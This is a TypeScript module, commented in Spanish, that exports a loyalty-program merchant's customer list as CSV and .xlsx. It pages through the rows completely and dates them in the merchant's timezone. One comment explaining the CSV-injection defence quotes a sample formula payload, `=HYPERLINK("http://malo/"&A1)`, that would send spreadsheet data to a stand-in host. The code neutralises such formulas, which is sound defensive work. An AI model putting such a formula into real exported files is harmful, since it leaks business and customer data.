import type { SupabaseClient } from '@supabase/supabase-js';
import type { Cell } from 'write-excel-file/node';
import type { Database } from '../supabase/types';
import { listarProgramas } from './programas';
import { describirFila, COLUMNAS_ESTADO, type NivelDeDescuento } from '../tarjetas/estadoTarjeta';
import { hoyEnZona } from '../tarjetas/vigencia';
import { listarNiveles } from '../tarjetas/descuento';
import { paginarPorRango, MAXIMO_POR_PAGINA, TOPE_FILAS } from '../reportes/paginar';
import { reporteClientes, type OpcionesPaginado } from '../reportes/reportes';
import { fechaExcel, diaExcel, FORMATO_DIA_EXCEL } from '../reportes/fechaExcel';
import { hojaTabular, celdaTelefono, type Columna, type HojaExcel } from '../reportes/excelReportes';

// Exportación de la base de clientes del comercio, en CSV y en .xlsx (la misma lista: una fila por
// TARJETA). "Tus datos son tuyos" es algo que la competencia vende explícitamente y que acá no existía.
//
// Las dos partes difíciles de un CSV no son generarlo:
//   1. Que Excel no ejecute nada. Ver escaparCelda.
//   2. Que Excel lea bien los acentos. Ver BOM_UTF8.
//
// Y lo difícil de las dos salidas es LEER la lista completa y cierta (plan 2026-09-23, Tarea 6; spec
// §6). Hasta el 2026-09-24 tenía cuatro defectos que el .xlsx habría heredado: las tarjetas se pedían
// sin paginar (PostgREST corta en 1000 sin avisar); las visitas salían de reporte_top_clientes, que
// también se cortaba en 1000 (del cliente 1001 en adelante, 0 visitas); el error de esa RPC se
// ignoraba (visitas en 0 en silencio); y "Cliente desde" era el día UTC y no el del comercio. Ver
// filasParaExportar.

export interface FilaExportacion {
  nombre: string;
  // Columna PROPIA (0036), no unida al nombre con `nombreCompleto`: el dueño que ordena o filtra la
  // hoja por apellido necesita el dato solo. Cadena vacía en los clientes registrados antes del
  // apellido, que lo tienen en null.
  apellido: string;
  telefono: string;
  // A cuál de las tarjetas del comercio pertenece la fila. Sin esta columna, en un comercio con dos
  // programas activos la fila de alguien con 8 sellos y la de alguien con $8.00 se ven identicas.
  tarjeta: string;
  // YA FORMATEADO en el idioma de ese programa: "8 sellos", "$12.50 disponibles", "3 visitas
  // disponibles", "Activa hasta el 7 de octubre de 2026". Es un string y no un numero A PROPOSITO
  // — `puntos_actuales` es un contador universal cuyo significado depende del tipo, y exportar 1250
  // bajo una columna llamada "Saldo" no es ambiguo: es falso por un factor de cien. Mezclar
  // unidades en una columna hace que sumarla no signifique nada de todas formas, asi que la
  // claridad no cuesta aritmetica. En cupon, membresia y descuento ni siquiera hay un numero: el
  // estado es una fecha o un nivel, y por eso lo arma `describirFila` y no `describirCosto`.
  saldo: string;
  // Las visitas del CLIENTE en el comercio (reporte_clientes, la definición de la 0033: acreditación,
  // uso o renovación; los ajustes no). Se repiten en cada una de sus tarjetas —por eso la columna dice
  // "Visitas (todas sus tarjetas)"— y sumar la columna duplica.
  visitas: number;
  // AAAA-MM-DD, el día LOCAL del comercio en que nació la tarjeta (su zona_horaria), no el de UTC.
  alta: string;
}

// Excel y Google Sheets interpretan como FÓRMULA toda celda que empiece con =, +, - o @ (y con tab
// o retorno de carro). Un cliente llamado "=1+1" es una curiosidad; uno llamado
// `=HYPERLINK("http://malo/"&A1)` convierte el CSV que el dueño abre en su computadora en un
// exfiltrador de su propia base. Es una vulnerabilidad conocida (CSV injection) y el archivo lo
// abre alguien que confía en él, que es justo lo que la hace efectiva.
//
// La defensa estándar: anteponer un apóstrofo, que Excel trata como "esto es texto" y no muestra.
//
// Efecto secundario que resulta DESEABLE: todo teléfono canónico empieza con '+', así que todos
// caen acá. Está bien — sin el apóstrofo, Excel convertiría +50377771234 en el número 50377771234 y
// se comería el signo, mutilando la columna más importante del export. El apóstrofo lo preserva y
// no se ve. (Si algún día el CSV se consume desde un script en vez de una hoja de cálculo, ahí sí
// habría que revisarlo: el apóstrofo SÍ está en los bytes.)
const PELIGROSOS = ['=', '+', '-', '@', '\t', '\r'];

export function escaparCelda(valor: string | number | null | undefined): string {
  let texto = valor === null || valor === undefined ? '' : String(valor);

  if (texto.length > 0 && PELIGROSOS.includes(texto[0])) {
    texto = `'${texto}`;
  }

  // Comillas dobles duplicadas y el campo entre comillas: es la regla de RFC 4180. Se aplica
  // siempre, no solo cuando hay comas — un campo entrecomillado de más es válido, uno de menos
  // corre todas las columnas cuando el nombre trae una coma.
  return `"${texto.replace(/"/g, '""')}"`;
}

// Las columnas de las DOS salidas, en su orden: cada una junta su encabezado, su valor en el CSV y su
// celda en el .xlsx (con el ancho). Así el CSV y el .xlsx no pueden tener columnas distintas ni un
// rótulo distinto, y ningún encabezado queda corrido respecto de sus datos.
interface ColumnaExportacion extends Columna<FilaExportacion> {
  csv: (fila: FilaExportacion) => string | number;
}

// Texto en el .xlsx; la cadena vacía (el apellido de un cliente anterior a la 0036) es una celda VACÍA.
function texto(valor: string): Cell {
  return valor === '' ? null : { value: valor, type: String };
}

const COLUMNAS: ColumnaExportacion[] = [
  { titulo: 'Nombre', ancho: 18, csv: (f) => f.nombre, celda: (f) => texto(f.nombre) },
  { titulo: 'Apellido', ancho: 18, csv: (f) => f.apellido, celda: (f) => texto(f.apellido) },
  // En el CSV va con el apóstrofo de escaparCelda (todo teléfono canónico empieza con '+'); en el .xlsx,
  // como texto con formato "@" (celdaTelefono): ahí un '+' o un '=' no son fórmula.
  { titulo: 'Teléfono', ancho: 16, csv: (f) => f.telefono, celda: (f) => celdaTelefono(f.telefono) },
  { titulo: 'Tarjeta', ancho: 22, csv: (f) => f.tarjeta, celda: (f) => texto(f.tarjeta) },
  { titulo: 'Saldo', ancho: 30, csv: (f) => f.saldo, celda: (f) => texto(f.saldo) },
  {
    titulo: 'Visitas (todas sus tarjetas)',
    ancho: 14,
    csv: (f) => f.visitas,
    // NÚMERO en el .xlsx: el dueño la ordena y la filtra.
    celda: (f) => ({ value: f.visitas, type: Number }),
  },
  {
    titulo: 'Cliente desde',
    ancho: 13,
    csv: (f) => f.alta,
    // Una fecha de Excel, no el texto AAAA-MM-DD. El día ya es LOCAL del comercio: diaExcel no convierte
    // nada, solo lo arma en UTC, que es como write-excel-file lo pasa a número de serie.
    celda: (f) => ({ value: diaExcel(f.alta), type: Date, format: FORMATO_DIA_EXCEL }),
  },
];

export function generarCsv(filas: FilaExportacion[]): string {
  const lineas = [
    COLUMNAS.map((c) => escaparCelda(c.titulo)).join(','),
    ...filas.map((f) => COLUMNAS.map((c) => escaparCelda(c.csv(f))).join(',')),
  ];
  // CRLF, no LF: es lo que dice RFC 4180 y lo que Excel en Windows espera.
  return lineas.join('\r\n');
}

// La misma lista como la hoja "Clientes" de un .xlsx (spec 2026-09-23 §6). PURA: la ruta la escribe con
// escribirXlsx (lib/reportes/excelReportes.ts), con el mismo encabezado en negrita y la primera fila fija
// que el Excel de Reportes.
export function hojaClientesExcel(filas: FilaExportacion[]): HojaExcel {
  return hojaTabular('Clientes', COLUMNAS, filas);
}

// Sin el BOM, Excel en Windows abre el archivo como ANSI y "José" se ve "JosÃ©". Es el detalle que
// hace que un export se sienta roto aunque los datos estén perfectos.
export const BOM_UTF8 = '﻿';

// El día LOCAL del comercio en que pasó un instante, AAAA-MM-DD. Nunca `created_at.slice(0, 10)`: ese
// es el día UTC, y una tarjeta de las 19:00 en El Salvador ya es del día siguiente en UTC.
//
// Con fechaExcel (que devuelve un Date cuyos componentes UTC SON el reloj del comercio, y reusa UN
// formateador por zona) y no con hoyEnZona fila por fila: hoyEnZona arma un Intl.DateTimeFormat en
// cada llamada, y medido el 2026-09-24, 10 000 tarjetas costaban 1,2 s así contra 18 ms reusando uno.
// Un instante ilegible LANZA (fechaExcel): la ruta responde 500 en vez de inventar una fecha.
function diaLocal(instante: string, zonaHoraria: string): string {
  return fechaExcel(instante, zonaHoraria).toISOString().slice(0, 10);
}

// Las filas del export, una por tarjeta, en el orden en que nacieron. null si NO se pudo leer algo
// de lo que decide lo que dice el archivo (las tarjetas, las visitas o la zona del comercio): nunca
// una lista a medias ni visitas en 0 que parezcan ciertas (la ruta responde 500).
//
// `tamanoPagina` es INYECTABLE para que las pruebas paginen de a 2 con cinco tarjetas; en producción,
// el max-rows de PostgREST (1000).
export async function filasParaExportar(
  supabase: SupabaseClient<Database>,
  comercioId: string,
  opciones: OpcionesPaginado = {},
): Promise<FilaExportacion[] | null> {
  const tamano = opciones.tamanoPagina ?? MAXIMO_POR_PAGINA;

  const [tarjetas, visitas, programas, comercio] = await Promise.all([
    // TODAS las tarjetas, de a `tamano` (paginarPorRango): sin paginar, PostgREST devolvía las primeras
    // 1000 y nada avisaba que había más. El orden es TOTAL —created_at y, en un empate, el id—: con
    // `.range()`, un orden que empata deja que dos páginas se solapen o se salteen una fila.
    //
    // COLUMNAS_ESTADO y no una lista escrita a mano: la lista y el formateador viajan JUNTOS a
    // propósito (ver lib/tarjetas/estadoTarjeta.ts). Hasta el 2026-09-08 este select traía solo
    // `puntos_actuales`, y por eso la columna "Saldo" salía vacía en cupón, membresía y descuento —
    // los tres tipos cuyo estado es una fecha o un nivel, no un número.
    paginarPorRango(async (inicio, fin) => {
      const { data, error } = await supabase
        .from('tarjetas')
        .select(`${COLUMNAS_ESTADO}, created_at, cliente_id, programa_id, clientes(nombre, apellido, telefono)`)
        .eq('comercio_id', comercioId)
        .order('created_at', { ascending: true })
        .order('id', { ascending: true })
        .range(inicio, fin);
      if (error) {
        console.error('[exportar] falló la consulta de tarjetas:', error);
        return null;
      }
      return data ?? [];
    }, tamano),
    // Las visitas de cada cliente en ESTE comercio, sin fechas ni filtros: reporte_clientes (0040) en
    // modo 'todas', que pagina con su p_offset. Reusa la definición de "visita" del resto del panel en
    // vez de inventar otra. Antes salían de reporte_top_clientes con p_limite 100 000, que PostgREST
    // cortaba igual en 1000: del cliente 1001 en adelante, 0 visitas.
    reporteClientes(
      supabase,
      { comercioIds: [comercioId], desde: null, hasta: null, sucursalId: null, cajeroId: null },
      { modo: 'todas', tamanoPagina: tamano },
    ),
    // El nombre y el TIPO de cada programa: el tipo es lo que decide en que unidad se lee el saldo.
    // `soloActivos: false` porque una tarjeta emitida en un programa que despues se desactivo sigue
    // existiendo, y su duenno tiene derecho a verla en su export.
    listarProgramas(supabase, comercioId, { soloActivos: false }),
    // La zona del COMERCIO: decide el día de "Cliente desde" y el "hoy" de las membresías.
    supabase.from('comercios').select('zona_horaria').eq('id', comercioId).maybeSingle(),
  ]);

  // Cada `null` ya lo registró quien leyó (la consulta de arriba, reporteClientes). Antes, un error de
  // las visitas se ignoraba y el archivo salía con TODOS en 0: se veía cierto y no lo era.
  if (tarjetas === null || visitas === null) return null;
  // El tope de paginar (TOPE_FILAS) corta y lo avisa. El Excel de Reportes lo escribe en su Resumen;
  // esta lista no tiene dónde decirlo, y cortada sería el mismo defecto de antes (una lista que parece
  // completa), solo que más lejos. Con los pilotos, órdenes de magnitud por debajo.
  if (tarjetas.alcanzoTope) {
    console.error(`[exportar] más de ${TOPE_FILAS} tarjetas: no se exporta una lista incompleta`);
    return null;
  }
  if (visitas.alcanzoTope) {
    console.error(`[exportar] más de ${TOPE_FILAS} clientes con actividad: no se exporta con visitas incompletas`);
    return null;
  }
  if (comercio.error || !comercio.data) {
    // Sin la zona no se sabe qué día nació cada tarjeta: suponer El Salvador le cambiaría el día a un
    // comercio de otra zona.
    console.error('[exportar] no se pudo leer la zona horaria del comercio:', comercio.error);
    return null;
  }
  const zona = comercio.data.zona_horaria;

  // Una fila por cliente (p_comercios es este solo comercio). Un cliente que no está no tuvo
  // actividad, y 0 es cierto: la lista vino COMPLETA (sin error y sin tope, chequeado arriba).
  const visitasPorCliente = new Map(visitas.filas.map((f) => [f.cliente_id, f.operaciones]));
  const programaPorId = new Map((programas ?? []).map((p) => [p.id, p]));

  // Los niveles solo hacen falta si el comercio tiene un programa de descuento; casi ninguno lo
  // usa, asi que no se paga la consulta de gusto (mismo criterio que la pantalla Clientes).
  let niveles: NivelDeDescuento[] = [];
  if ((programas ?? []).some((p) => p.tipoTarjeta === 'descuento')) {
    niveles = (await listarNiveles(supabase, comercioId)) ?? [];
  }

  // El "hoy" del COMERCIO, no el del servidor: es lo que decide si una membresia se lee "Activa
  // hasta el ..." o "Vencida el ...", y esa diferencia le regalaria o le quitaria un dia entero.
  const hoyIso = hoyEnZona(zona);

  return tarjetas.filas
    .filter((t) => t.clientes)
    .map((t) => {
      const programa = programaPorId.get(t.programa_id);
      return {
        nombre: t.clientes!.nombre,
        apellido: t.clientes!.apellido ?? '',
        telefono: t.clientes!.telefono,
        tarjeta: programa?.nombre ?? '',
        saldo: describirFila(t, programa?.tipoTarjeta ?? 'puntos', programa?.selloMeta ?? null, niveles, hoyIso),
        visitas: visitasPorCliente.get(t.cliente_id) ?? 0,
        // Solo la fecha, sin hora: es un dato de negocio, no forense. El historial por cliente ya
        // cubre el detalle con hora. La del COMERCIO: ver diaLocal.
        alta: diaLocal(t.created_at, zona),
      };
    });
}
